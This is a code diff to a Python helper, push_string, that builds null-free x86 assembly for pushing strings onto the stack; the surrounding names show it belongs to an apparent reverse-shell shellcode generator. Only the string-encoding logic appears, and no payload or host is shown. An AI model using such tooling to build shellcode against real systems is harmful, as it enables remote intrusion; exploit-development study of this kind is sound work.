@@ -47,35 +47,32 @@ def push_function_hash(function_name):
 def push_string(input_string):
     rev_hex_payload = str(to_hex(input_string))
     rev_hex_payload_len = len(rev_hex_payload)
-
     instructions = []
-    first_instructions = []
-    null_terminated = False
-    for i in range(rev_hex_payload_len, 0, -1):
-        # add every 4 byte (8 chars) to one push statement
-        if ((i != 0) and ((i % 8) == 0)):
-            target_bytes = rev_hex_payload[i-8:i]
-            instructions.append(f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
-        # handle the left ofer instructions
-        elif ((0 == i-1) and ((i % 8) != 0) and (rev_hex_payload_len % 8) != 0):
-            if (rev_hex_payload_len % 8 == 2):
-                first_instructions.append(f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
-                first_instructions.append("push eax;")
-            elif (rev_hex_payload_len % 8 == 4):
-                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
-                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
-                first_instructions.append("push eax;")
-            else:
-                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
-                first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
-                first_instructions.append("push eax;")
-                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
-                first_instructions.append("push ax;")
-            null_terminated = True
 
-    instructions = first_instructions + instructions
-    asm_instructions = "".join(instructions)
-    return asm_instructions
+    instructions.append("xor eax, eax;")
+    if (rev_hex_payload_len % 8 == 2):
+        instructions.append(f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - 2):]};")
+        instructions.append("push eax;")
+        rev_hex_payload_len -= 2
+    elif (rev_hex_payload_len % 8 == 4):
+        target_bytes = rev_hex_payload[(rev_hex_payload_len - 4):]
+        instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
+        instructions.append("push eax;")
+        rev_hex_payload_len -= 4
+    elif (rev_hex_payload_len % 8 == 6):
+        target_bytes = rev_hex_payload[(rev_hex_payload_len - 6):]
+        instructions.append(f"mov al, 0x{target_bytes[4:6]};")
+        instructions.append(f"shl eax, 16;")
+        instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
+        instructions.append("push eax;")
+        rev_hex_payload_len -= 6
+    else:
+        instructions.append("push eax;")
+
+    for i in range(rev_hex_payload_len, 0, -8):
+        target_bytes = rev_hex_payload[i-8:i]
+        instructions.append(f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")    
+    return "".join(instructions)
 
 
 def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
